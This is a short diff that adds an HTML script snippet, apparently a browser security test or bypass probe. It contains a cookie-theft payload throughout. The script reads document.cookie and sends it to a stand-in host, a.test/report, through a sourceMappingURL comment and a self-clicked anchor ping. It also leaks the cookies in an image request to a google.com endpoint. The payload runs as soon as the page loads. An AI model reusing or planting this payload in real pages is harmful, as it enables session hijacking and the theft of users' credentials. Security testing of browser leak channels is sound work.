@@ -1,0 +1,9 @@
+<script>
+  // Attempt to use a source map and a ping attribute to extract cookies
+  document.write(`<script># sourceMappingURL=https://a.test/report/?leak=c661126-${escape(document.cookie)}</script>`);
+  var a = document.createElement('a');
+  a.href = '#';
+  a.ping = `https://a.test/report/?leak=c661126-${escape(document.cookie)}`;
+  a.click();
+</script>
+<img src="https://www.google.com/csi?${escape(document.cookie)}">
